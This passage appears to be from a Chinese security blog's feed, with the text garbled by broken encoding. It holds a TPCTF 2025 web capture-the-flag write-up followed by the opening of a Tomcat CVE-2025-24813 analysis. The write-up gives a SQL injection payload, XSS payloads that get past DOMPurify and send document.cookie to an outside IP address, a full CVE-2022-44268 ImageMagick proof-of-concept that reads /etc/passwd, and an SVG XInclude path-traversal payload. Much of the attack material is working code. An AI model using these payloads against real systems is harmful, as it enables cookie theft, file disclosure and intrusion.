deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Priority: u=0, i</span><br><span class="line">Content-Type: multipart/form-data; boundary=aaa;</span><br><span class="line">Content-Length: 198</span><br><span class="line"></span><br><span class="line">--aaa</span><br><span class="line">Content-Disposition: form-data; name=&quot;username&quot;</span><br><span class="line"></span><br><span class="line">admin</span><br><span class="line">--aaa</span><br><span class="line">Content-Disposition: form-data; name=&quot;password&quot;;filename=&quot;1&quot;;</span><br><span class="line">Content-Disposition: form-data; name=&quot;password&quot;;</span><br><span class="line">Content-Type: image/png</span><br><span class="line"></span><br><span class="line">1&#x27;/**/union/**/select/**/1,2,replace(replace(&#x27;1&quot;/**/union/**/select/**/1,2,replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)-- &#x27;,char(34),char(39)),char(46),&#x27;1&quot;/**/union/**/select/**/1,2,replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)-- &#x27;)-- </span><br><span class="line">--aaa--</span><br></pre></td></tr></table></figure><h2 id="safe-layout"><a href="#safe-layout" class="headerlink" title="safe layout"></a>safe layout</h2><p>è¿™é“é¢˜çš„webç•Œé¢å’Œbotç•Œé¢å’Œbaby layoutæ˜¯ä¸€æ¨¡ä¸€æ ·çš„ã€‚</p><p>é‚£ä¹ˆæ¥ä¸‹æ¥æˆ‘ä»¬æ‰¾ä¸€ä¸‹åŒºåˆ«ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">const sanitizedContent = DOMPurify.sanitize(content, &#123; ALLOWED_ATTR: [] &#125;);</span><br><span class="line">const sanitizedLayout = DOMPurify.sanitize(layout, &#123; ALLOWED_ATTR: [] &#125;);</span><br><span class="line"></span><br><span class="line">const sanitizedContent = DOMPurify.sanitize(content);</span><br><span class="line">const sanitizedLayout = DOMPurify.sanitize(layout);</span><br></pre></td></tr></table></figure><p>é—®ä¸€ä¸‹aiä»–ä»¬çš„åŒºåˆ«ã€‚</p><blockquote><p><code>&#123; ALLOWED_ATTR: [] &#125;</code>ï¼š</p><ul><li><code>ALLOWED_ATTR</code> æ˜¯ DOMPurify çš„é€‰é¡¹ï¼Œç”¨äºæŒ‡å®š <strong>å…è®¸çš„ HTML å±æ€§</strong>ã€‚</li><li><code>[]</code> ä¸ºç©ºæ•°ç»„ï¼Œè¡¨ç¤º<strong>ä¸å…è®¸ä»»ä½• HTML å±æ€§</strong>ï¼ˆå¦‚ <code>href</code>ã€<code>src</code>ã€<code>onclick</code> ç­‰ï¼‰ã€‚</li><li>ä½†<strong>HTML æ ‡ç­¾ä»ç„¶å¯ä»¥ä¿ç•™</strong>ï¼Œæ¯”å¦‚ <code>&lt;b&gt;text&lt;/b&gt;</code> ä»ç„¶æœ‰æ•ˆï¼Œä½† <code>&lt;a href=&quot;example.com&quot;&gt;link&lt;/a&gt;</code> ä¼šå˜æˆ <code>&lt;a&gt;link&lt;/a&gt;</code>ï¼ˆå› ä¸º <code>href</code> è¢«ç§»é™¤ï¼‰ã€‚</li></ul></blockquote><p>å…ˆæœ¬åœ°çœ‹çœ‹æ•ˆæœï¼š</p><img src="/2025/03/30/TPCTF2025-wp/image-20250326210831685.png" class="" title="This is an example image"><p>é™¤äº†htmlæ ‡ç­¾éƒ½æ²¡äº†ï¼</p><p><a href="https://mizu.re/post/exploring-the-dompurify-library-hunting-for-misconfigurations">https://mizu.re/post/exploring-the-dompurify-library-hunting-for-misconfigurations</a></p><img src="/2025/03/30/TPCTF2025-wp/image-20250326233334620.png" class="" title="This is an example image"><p>æˆ‘ä»¬å¯ä»¥ç”¨è¿™ç§æ–¹æ³•æ¥ç»•è¿‡ï¼</p><img src="/2025/03/30/TPCTF2025-wp/image-20250326233448334.png" class="" title="This is an example image"><p>æ‹¼æ¥ä¸€ä¸‹å§~</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;img aria-meteor=&quot;&#123;&#123;content&#125;&#125;&quot;&gt;</span><br><span class="line"></span><br><span class="line">x&quot; src=&quot;x&quot; onerror=&quot;window.open(&#x27;http://156.238.233.113:4567/?cookie=&#x27;+document.cookie)</span><br></pre></td></tr></table></figure><img src="/2025/03/30/TPCTF2025-wp/image-20250327003038456.png" class="" title="This is an example image"><p>æ„Ÿè§‰æ˜¯å¯ä»¥äº†ï¼</p><img src="/2025/03/30/TPCTF2025-wp/image-20250327003114722.png" class="" title="This is an example image"><h2 id="safe-layout-revenge"><a href="#safe-layout-revenge" class="headerlink" title="safe layout revenge"></a>safe layout revenge</h2><p>é™„ä»¶å¯†ç ï¼šTPCTF{D0_n07_M0D1FY_7h3_0U7PU7_Af73R_H7mL_5aN171z1n9}</p><p>å˜åŒ–å¦‚ä¸‹ï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> sanitizedContent = <span class="title class_">DOMPurify</span>.<span class="title function_">sanitize</span>(content, &#123;</span><br><span class="line">    <span class="attr">ALLOWED_ATTR</span>: [],</span><br><span class="line">    <span class="attr">ALLOW_ARIA_ATTR</span>: <span class="literal">false</span>,</span><br><span class="line">    <span class="attr">ALLOW_DATA_ATTR</span>: <span class="literal">false</span>,</span><br><span class="line">  &#125;);</span><br><span class="line">  </span><br><span class="line"><span class="keyword">const</span> sanitizedLayout = <span class="title class_">DOMPurify</span>.<span class="title function_">sanitize</span>(layout, &#123;</span><br><span class="line">    <span class="attr">ALLOWED_ATTR</span>: [],</span><br><span class="line">    <span class="attr">ALLOW_ARIA_ATTR</span>: <span class="literal">false</span>,</span><br><span class="line">    <span class="attr">ALLOW_DATA_ATTR</span>: <span class="literal">false</span>,</span><br><span class="line">  &#125;);</span><br></pre></td></tr></table></figure><p>è¿™ä¸‹å­æŠŠdataå’Œariaéƒ½banäº†ã€‚</p><img src="/2025/03/30/TPCTF2025-wp/image-20250328165443147.png" class="" title="This is an example image"><p>æœ¬åœ°æµ‹ä¸€ä¸‹ï¼š</p><img src="/2025/03/30/TPCTF2025-wp/image-20250328165619960.png" class="" title="This is an example image"><p>æ•´ä½“æ€è·¯æ˜¯é‡‡ç”¨ style ç»•è¿‡ï¼Œæµ‹è¯•å‘ç°å½“ style æ ‡ç­¾å‰é¢è·Ÿä¸Šä¸€äº›å­—ç¬¦æ—¶ï¼Œstyle å†…éƒ¨çš„å…ƒç´ å¯èƒ½ä¼šå¾—ä»¥ä¿ç•™ï¼Œæ•…è¿™é‡Œé‡‡ç”¨çš„æ˜¯åˆ é™¤ç­–ç•¥ï¼ŒæŠŠ xss çš„ payload æ„é€ å¥½åï¼ŒæŠŠ script æ ‡ç­¾æ’å…¥ contentï¼Œåœ¨ç¬¬äºŒæ¬¡ post çš„æ—¶å€™åˆ é™¤å°±è¡Œã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">xxx&lt;style&gt;&lt;&#123;&#123;content&#125;&#125;/style&gt;&lt;&#123;&#123;content&#125;&#125;img src=x onerror=&quot;window.open(&#x27;http://156.238.233.113:4567/?cookie=&#x27;+document.cookie)&quot;&gt;</span><br><span class="line"></span><br><span class="line">&quot;&quot;</span><br></pre></td></tr></table></figure><img src="/2025/03/30/TPCTF2025-wp/image-20250328170944060.png" class="" title="This is an example image"><img src="/2025/03/30/TPCTF2025-wp/image-20250328171011261.png" class="" title="This is an example image"><h2 id="thumbor-1"><a href="#thumbor-1" class="headerlink" title="thumbor 1"></a>thumbor 1</h2><p>åªç»™äº†ä¸€ä¸ªDockerfileã€‚æ‰“å¼€çœ‹çœ‹ã€‚é™„ä»¶ç»™çš„æ˜¯thumborçš„æ’ä»¶ç¯å¢ƒ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">FROM python:3.7.11-buster</span><br><span class="line">RUN apt-get update &amp;&amp; apt-get install -y libexiv2-dev libboost-python-dev exiftool</span><br><span class="line">RUN git clone --depth 1 https://gerrit.wikimedia.org/r/operations/software/thumbor-plugins</span><br><span class="line">RUN pip install -r thumbor-plugins/requirements.txt</span><br><span class="line">RUN dd if=thumbor-plugins/README.md of=thumbor.conf bs=1 count=1947 skip=610</span><br><span class="line">RUN echo TPCTF&#123;...&#125; &gt; /flag</span><br><span class="line">ENV PYTHONPATH=/thumbor-plugins</span><br><span class="line">ENTRYPOINT thumbor --port 8800 --conf=thumbor.conf -a wikimedia_thumbor.app.App</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ä»–ä¸‹è½½äº†thumbor-pluginsï¼Œæˆ‘ä»¬ä¸‹è½½ä¸€ä¸‹æºç çœ‹çœ‹ã€‚</p><p>æ³¨æ„ï¼Œè¿™é‡Œçš„æºç è¦åœ¨dockerä¸­ä¸‹è½½æ‰è¡Œå“¦~</p><img src="/2025/03/30/TPCTF2025-wp/image-20250329151611253.png" class="" title="This is an example image"><p>è¿™é‡Œä¸»è¦éœ€è¦å…³æ³¨engineæ–‡ä»¶å¤¹å’Œhandleræ–‡ä»¶å¤¹ã€‚ä¸€ä¸ªå¼•æ“ä¸€ä¸ªè·¯ç”±ã€‚</p><p>å‘ç°handleræ–‡ä»¶å¤¹ä¸‹æœ‰ä¸‰ä¸ªæ–‡ä»¶å¤¹ï¼Œå¯¹åº”ä¸‰ä¸ªè·¯ç”±ã€‚</p><img src="/2025/03/30/TPCTF2025-wp/image-20250329151740837.png" class="" title="This is an example image"><p>å†çœ‹çœ‹engineæ–‡ä»¶å¤¹ï¼Œåœ¨å…¶ä¸­å‘ç°äº†imagemagickã€‚</p><img src="/2025/03/30/TPCTF2025-wp/image-20250329151836721.png" class="" title="This is an example image"><blockquote><p><strong>About</strong></p><p>ImageMagick is a powerful, open-source software suite for creating, editing, converting, and manipulating images in over 200 formats. Ideal for web developers, graphic designers, and researchers, it offers versatile tools for image processing, including batch processing, format conversion, and complex image transformations.</p></blockquote><p>é‚£ä¹ˆå°±æ˜¯è¯´æ˜thumbor-pluginsä¸­ç”¨åˆ°äº†imagemagickï¼Œå¦‚æœimagemagickå­˜åœ¨æ¼æ´é‚£ä¹ˆå°±å¯ä»¥æ‰“å•¦~</p><p>ç½‘ä¸Šå¯ä»¥æœåˆ°cve2016çš„å’Œcve2022çš„ï¼Œç›´æ¥å°è¯•ç”¨2022çš„ä»»æ„æ–‡ä»¶è¯»å–ã€‚</p><p><a href="https://forum.butian.net/article/444">https://forum.butian.net/article/444</a></p><img src="/2025/03/30/TPCTF2025-wp/image-20250329154503313.png" class="" title="This is an example image"><p>ç¯å¢ƒæ˜¯å¥½çš„ï¼Œé‚£ä¹ˆæ¥ä¸‹æ¥å°±æ˜¯æ¼æ´åˆ©ç”¨äº†ã€‚</p><p>ä½†æ˜¯è¿™ä¸ªæ¼æ´éœ€è¦æˆ‘ä»¬ä¸Šä¼ æ¶æ„å›¾ç‰‡åˆ°æœåŠ¡ç«¯å•Šï¼Œå¯æ˜¯è¿™thumbor1æ²¡æœ‰ä»»ä½•ä¸Šä¼ çš„åœ°æ–¹ã€‚</p><p><a href="https://thumbor.readthedocs.io/en/latest/security.html">https://thumbor.readthedocs.io/en/latest/security.html</a></p><img src="/2025/03/30/TPCTF2025-wp/image-20250329155915387.png" class="" title="This is an example image"><p>é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥æŠŠæ¶æ„å›¾ç‰‡æ”¾åˆ°è‡ªå·±çš„vpsï¼Œè®©é¶æœºå»è®¿é—®æˆ‘ä»¬ï¼</p><p>poc.pyï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> png</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"></span><br><span class="line">logging.basicConfig(stream=sys.stderr, level=logging.INFO, <span class="built_in">format</span>=<span class="string">&#x27;%(asctime)s - %(levelname)s - %(message)s&#x27;</span>)</span><br><span class="line">d = zlib.decompressobj()</span><br><span class="line">e = zlib.compressobj()</span><br><span class="line">IHDR = <span class="string">b&#x27;\x00\x00\x00\n\x00\x00\x00\n\x08\x02\x00\x00\x00&#x27;</span></span><br><span class="line">IDAT = <span class="string">b&#x27;x\x9c\xbd\xcc\xa1\x11\xc0 \x0cF\xe1\xb4\x03D\x91\x8b`\xffm\x98\x010\x89\x01\xc5\x00\xfc\xb8\n\x8eV\xf6\xd9&#x27;</span> \</span><br><span class="line">       <span class="string">b&#x27;\xef\xee])%z\xef\xfe\xb0\x9f\xb8\xf7^J!\xa2Zkkm\xe7\x10\x02\x80\x9c\xf3\x9cSD\x0esU\x1dc\xa8\xeaa\x0e\xc0&#x27;</span> \</span><br><span class="line">       <span class="string">b&#x27;\xccb\x8cf\x06`gwgf\x11afw\x7fx\x01^K+F&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">parse_data</span>(<span class="params">data: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    _, data = data.strip().split(<span class="string">b&#x27;\n&#x27;</span>, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> binascii.unhexlify(data.replace(<span class="string">b&#x27;\n&#x27;</span>, <span class="string">b&#x27;&#x27;</span>)).decode()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">filename: <span class="built_in">str</span></span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> filename:</span><br><span class="line">        logging.error(<span class="string">&#x27;you must specify a input filename&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    res = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    p = png.Reader(filename=filename)</span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> p.chunks():</span><br><span class="line">        logging.info(<span class="string">&quot;chunk %s found, value = %r&quot;</span>, k.decode(), v)</span><br><span class="line">        <span class="keyword">if</span> k == <span class="string">b&#x27;zTXt&#x27;</span>:</span><br><span class="line">            name, data = v.split(<span class="string">b&#x27;\x00&#x27;</span>, <span class="number">1</span>)</span><br><span class="line">            res = parse_data(d.decompress(data[<span class="number">1</span>:]))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> res:</span><br><span class="line">        sys.stdout.write(res)</span><br><span class="line">        sys.stdout.flush()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">from_filename, to_filename, read_filename</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> to_filename:</span><br><span class="line">        logging.error(<span class="string">&#x27;you must specify a output filename&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(to_filename, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(png.signature)</span><br><span class="line">        <span class="keyword">if</span> from_filename:</span><br><span class="line">            p = png.Reader(filename=from_filename)</span><br><span class="line">            <span class="keyword">for</span> k, v <span class="keyword">in</span> p.chunks():</span><br><span class="line">                <span class="keyword">if</span> k != <span class="string">b&#x27;IEND&#x27;</span>:</span><br><span class="line">                    png.write_chunk(f, k, v)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            png.write_chunk(f, <span class="string">b&#x27;IHDR&#x27;</span>, IHDR)</span><br><span class="line">            png.write_chunk(f, <span class="string">b&#x27;IDAT&#x27;</span>, IDAT)</span><br><span class="line"></span><br><span class="line">        png.write_chunk(f, <span class="string">b&quot;tEXt&quot;</span>, <span class="string">b&quot;profile\x00&quot;</span> + read_filename.encode())</span><br><span class="line">        png.write_chunk(f, <span class="string">b&#x27;IEND&#x27;</span>, <span class="string">b&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">&#x27;POC for CVE-2022-44268&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;action&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, choices=(<span class="string">&#x27;generate&#x27;</span>, <span class="string">&#x27;parse&#x27;</span>))</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-i&#x27;</span>, <span class="string">&#x27;--input&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&#x27;input filename&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-o&#x27;</span>, <span class="string">&#x27;--output&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&#x27;output filename&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-r&#x27;</span>, <span class="string">&#x27;--read&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&#x27;target file to read&#x27;</span>, default=<span class="string">&#x27;/etc/passwd&#x27;</span>)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line">    <span class="keyword">if</span> args.action == <span class="string">&#x27;generate&#x27;</span>:</span><br><span class="line">        write(args.<span class="built_in">input</span>, args.output, args.read)</span><br><span class="line">    <span class="keyword">elif</span> args.action == <span class="string">&#x27;parse&#x27;</span>:</span><br><span class="line">        read(args.<span class="built_in">input</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        logging.error(<span class="string">&quot;bad action&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python 123.py generate -o poc.png -r /etc/passwd</span><br></pre></td></tr></table></figure><p>ç„¶åæˆ‘ä»¬æŠŠç”Ÿæˆçš„poc.pngæ”¾åˆ°vpsçš„ç½‘ç«™ç›®å½•ä¸‹ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">156.238.233.113:8800/thumbor/unsafe/450x/156.238.233.113/poc.png</span><br></pre></td></tr></table></figure><img src="/2025/03/30/TPCTF2025-wp/image-20250329161032473.png" class="" title="This is an example image"><p>ç»™è¿™ä¸ªå›¾ç‰‡ä¸‹è½½ä¸‹æ¥ã€‚ç„¶åæˆ‘ä»¬æå–å›¾ç‰‡ä¸­çš„å†…å®¹ï¼</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python 123.py parse -i poc11.png</span><br></pre></td></tr></table></figure><img src="/2025/03/30/TPCTF2025-wp/image-20250329161140805.png" class="" title="This is an example image"><p>æ‹¿ä¸‹äº†ã€‚ã€‚ã€‚é‚£ä¹ˆæ¥ä¸‹æ¥ç›´æ¥æflagçš„ã€‚</p><img src="/2025/03/30/TPCTF2025-wp/image-20250329162020388.png" class="" title="This is an example image"><p>åå…­è¿›åˆ¶è§£ç ä¸€ä¸‹è·å–flagï¼ï¼</p><h2 id="thumbor-2"><a href="#thumbor-2" class="headerlink" title="thumbor 2"></a>thumbor 2</h2><p>å…ˆçœ‹çœ‹DockerFileï¼Œå‘ç°è·Ÿthumbor1çš„æ²¡å•¥å¤§åŒºåˆ«ï¼Ÿè¿™é‡Œçš„dockerfileä¸­å¤šäº†ä¸€ä¸ªimagemagickã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">FROM pandoc/core:2.18-ubuntu</span><br><span class="line">RUN apt-get update &amp;&amp; apt-get install -y libexiv2-dev libboost-python-dev exiftool imagemagick git python3-pip libcurl4-openssl-dev libssl-dev</span><br><span class="line">RUN git clone --depth 1 https://gerrit.wikimedia.org/r/operations/software/thumbor-plugins</span><br><span class="line">RUN pip install -r thumbor-plugins/requirements.txt</span><br><span class="line">RUN dd if=thumbor-plugins/README.md of=thumbor.conf bs=1 count=1947 skip=610</span><br><span class="line">RUN echo TPCTF&#123;...&#125; &gt; /flag</span><br><span class="line">ENV PYTHONPATH=/data/thumbor-plugins</span><br><span class="line">ENTRYPOINT thumbor --port 8800 --conf=thumbor.conf -a wikimedia_thumbor.app.App</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å…ˆè¿›dockeræŠŠthumbor-pluginsæ–‡ä»¶å¤¹æ‹‰å‡ºæ¥çœ‹çœ‹æºç ã€‚</p><p>è¿™é“é¢˜çš„è€ƒç‚¹åœ¨è¿™ç¯‡æ–‡ç« ï¼š<a href="https://www.canva.dev/blog/engineering/when-url-parsers-disagree-cve-2023-38633/">https://www.canva.dev/blog/engineering/when-url-parsers-disagree-cve-2023-38633/</a></p><figure class="highlight svg"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span> standalone=<span class="string">&quot;no&quot;</span> ?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">width</span>=<span class="string">&quot;300&quot;</span> <span class="attr">height</span>=<span class="string">&quot;300&quot;</span> <span class="attr">xmlns:xi</span>=<span class="string">&quot;http://www.w3.org/2001/XInclude&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">rect</span> <span class="attr">width</span>=<span class="string">&quot;300&quot;</span> <span class="attr">height</span>=<span class="string">&quot;300&quot;</span> <span class="attr">style</span>=<span class="string">&quot;fill:rgb(255,204,204);&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">text</span> <span class="attr">x</span>=<span class="string">&quot;0&quot;</span> <span class="attr">y</span>=<span class="string">&quot;100&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">xi:include</span></span></span><br><span class="line"><span class="tag">      <span class="attr">href</span>=<span class="string">&quot;.?../../../../../../../flag&quot;</span></span></span><br><span class="line"><span class="tag">      <span class="attr">parse</span>=<span class="string">&quot;text&quot;</span></span></span><br><span class="line"><span class="tag">      <span class="attr">encoding</span>=<span class="string">&quot;ASCII&quot;</span></span></span><br><span class="line"><span class="tag">    &gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">xi:fallback</span>&gt;</span>file not found<span class="tag">&lt;/<span class="name">xi:fallback</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">xi:include</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">text</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure><img src="/2025/03/30/TPCTF2025-wp/image-20250330160754286.png" class="" title="This is an example image"><h2 id="Are-you-incognito"><a href="#Are-you-incognito" class="headerlink" title="Are you incognito?"></a>Are you incognito?</h2><p>å¥½åƒæ˜¯ä¸ª0dayï¼Œè¿™é‡Œç»™å‡ºwp</p><p><a href="https://z3n1th1.com/2025/03/tpctf2025-writeup/#are-you-incognito">https://z3n1th1.com/2025/03/tpctf2025-writeup/#are-you-incognito</a></p><p><a href="https://ouuan.moe/post/2025/03/tpctf-2025#are-you-incognito-3-solves">https://ouuan.moe/post/2025/03/tpctf-2025#are-you-incognito-3-solves</a></p>]]></content>
      
      
      <categories>
          
          <category> Webå®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2025-24813 Tomcat RCE åˆ†æå¤ç°</title>
      <link href="/2025/03/21/CVE-2025-24813-Tomcat-RCE-%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0/"/>
      <url>/2025/03/21/CVE-2025-24813-Tomcat-RCE-%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<p>å‚è€ƒæ–‡ç« ï¼š</p><p><a href="https://forum.butian.net/article/674">https://forum.butian.net/article/674</a></p><p><a href="https://github.com/iSee857/CVE-2025-24813-PoC/blob/main/Tomcat_CVE-2025-24813_RCE.py">https://github.com/iSee857/CVE-2025-24813-PoC/blob/main/Tomcat_CVE-2025-24813_RCE.py</a></p><p>çœ‹äº†å¥‡å®‰ä¿¡ç¤¾åŒºçš„æ–‡ç« å’Œå¤§bå“¥çš„æ–‡ç« åï¼Œè‡ªå·±æ¥å¤ç°ä¸€ä¸‹ã€‚</p><p><strong>æ¼æ´å½±å“èŒƒå›´ï¼š</strong></p><ul><li>9.0.0.M1 &lt;&#x3D; tomcat &lt;&#x3D; 9.0.98</li><li>10.1.0-M1 &lt;&#x3D; tomcat &lt;&#x3D; 10.1.34</li><li>11.0.0-M1 &lt;&#x3D; tomcat &lt;&#x3D; 11.0.2</li></ul><blockquote><p>Tomcat RCE å‰ä¸–ä»Šç”Ÿ</p><p>CVE-2017-12615 Tomcat PUT â½‚ä»¶ä¸Šä¼ </p><p>CVE-2020-9484ï¼šTomcat Session ååºåˆ—åŒ–æ¼æ´</p><p>CVE-2024-50379 ï¼šTomcat PUT æ¡ä»¶ç«äº‰â½‚ä»¶ä¸Šä¼ </p></blockquote><p><strong>æ¼æ´åˆ©ç”¨æ¡ä»¶ï¼š</strong></p><p>è¯¥æ¼æ´åˆ©ç”¨æ¡ä»¶è¾ƒä¸ºå¤æ‚ï¼Œéœ€åŒæ—¶æ»¡è¶³ä»¥ä¸‹å››ä¸ªæ¡ä»¶ï¼š</p><ol><li>åº”ç”¨ç¨‹åºå¯ç”¨äº†DefaultServletå†™å…¥åŠŸèƒ½ï¼Œè¯¥åŠŸèƒ½é»˜è®¤å…³é—­</li><li>åº”ç”¨æ”¯æŒäº† partial PUT è¯·æ±‚ï¼Œèƒ½å¤Ÿå°†æ¶æ„çš„åºåˆ—åŒ–æ•°æ®å†™å…¥åˆ°ä¼šè¯æ–‡ä»¶ä¸­ï¼Œè¯¥åŠŸèƒ½é»˜è®¤å¼€å¯</li><li>åº”ç”¨ä½¿ç”¨äº† Tomcat 